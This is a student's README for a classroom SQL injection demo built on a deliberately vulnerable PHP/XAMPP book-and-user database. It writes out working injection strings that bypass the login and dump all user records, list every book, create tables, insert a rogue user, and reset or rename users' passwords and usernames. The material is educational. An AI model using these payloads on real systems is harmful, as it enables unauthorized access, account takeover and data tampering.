# SQL-INJECTION-DEMO-
SQL INJECTION DEMO FOR CECS 378 INTRO TO COMPUTER SECUIRITY PRIVACY 

This demo shows how an SQL Injection attack is done. 

## Requirments 
- Uses XAMPP 

## Main Features
- Has a database that has three tables(Book, Staff, Users)
- SQL Database is used 
- PHP is used to connect the database
- Also has a feature to search up books by Book Title or by ISBN

SET UP FOR DATABASE
![Screen Shot 2021-11-28 at 1 18 05 AM](https://user-images.githubusercontent.com/48665751/143751884-d7d718b7-bdae-4dc2-a0a9-652603c3e113.png)

WHEN SIGNED IN WITH PROPER CREDENTIALS
![Screen Shot 2021-11-28 at 1 22 55 AM](https://user-images.githubusercontent.com/48665751/143755317-d65d1fdb-3198-43b7-bb38-2a39a6630ac1.png)

BOOK FINDER FEATURE 
![Screen Shot 2021-11-28 at 1 28 59 AM](https://user-images.githubusercontent.com/48665751/143759610-2f2e6464-b4f6-48d7-9a37-85a65a0be5fe.png)

WHEN USERS LOOK A BOOK UP
![Screen Shot 2021-11-28 at 1 31 16 AM](https://user-images.githubusercontent.com/48665751/143761220-2eb72be8-4612-4a00-8092-497f84e562bb.png)

WHEN SQL STATMENT <' OR '1'='1> IS USED IN THE LOGIN PAGE THIS RETURNS ALL USERS INFORMATION
![Screen Shot 2021-11-28 at 1 35 34 AM](https://user-images.githubusercontent.com/48665751/143762816-668523f8-5f62-41d8-aee9-7101ebed8059.png)

WHEN SQL STATEMENT <' or 1=1;--> IS USED IN BOOK FINDER FEATURE THIS RETURNS ALL THE BOOKS IN THE DATABASE
![Screen Shot 2021-11-28 at 1 40 50 AM](https://user-images.githubusercontent.com/48665751/143762953-6221ea48-dde2-4e11-9929-0b31cd12531c.png)

WHEN SQL STATMENT IS USED < ' OR '1'='1'; CREATE TABLE CUSTOMERS( ID INT NOT NULL, NAME VARCHAR (20) NOT NULL, AGE INT NOT NULL, ADDRESS CHAR (25) , SALARY DECIMAL (18, 2), PRIMARY KEY (ID) );-- > THIS CREATES A NEW TABLE IN THE DATABASE.
![Screen Shot 2021-11-28 at 2 18 48 AM](https://user-images.githubusercontent.com/48665751/143763964-fd82b85c-6430-4780-ba13-dca8f421a2a1.png) 

< ' OR '1'='1'; INSERT INTO Users(userName, password, firstName, lastName, memberID, phoneNumber, emailAddress, ISBN) values ('hackers','hacked','hacker-san','hacked','12345678','9996669999','hacker@gmail.com','190721');-- > THIS WILL ADD A USER TO USERS TABLE IN THE DATABASE.

![Screen Shot 2021-11-28 at 1 04 54 PM](https://user-images.githubusercontent.com/48665751/143785926-ae117fa2-26c2-4453-bd79-6d7b1a8b30d7.png)

< ' OR '1'='1'; UPDATE Users SET password = 'hacked3' WHERE userName = 'bravo360';-- > THIS WILL CHANGE THE PASSWORD OF USER "bravo360" to "hacked3". 
![Screen Shot 2021-11-28 at 1 17 09 PM](https://user-images.githubusercontent.com/48665751/143786291-125a5bec-53a8-42c0-a001-9a8bc0bf88a7.png)

< ' OR '1'='1'; UPDATE users SET password = 'hacked3';-- > THIS WILL SET All USERS PASSWORDS TO "hacked3".
![Screen Shot 2021-11-28 at 1 21 12 PM](https://user-images.githubusercontent.com/48665751/143786442-3e0a54de-9db7-4ed3-a427-309999f2ffd1.png)

< ' OR '1'='1'; UPDATE users SET userName = 'hacker' WHERE password = 'hacked3';-- > THIS WILL SET ALL THE USERS WITH WITH THE PASSOWRD "hacker3" USERNAMES TO "hacker" 
![Screen Shot 2021-11-28 at 3 57 50 PM](https://user-images.githubusercontent.com/48665751/143791555-cffe20f4-4419-49ee-be0a-1e31e16d50e1.png)





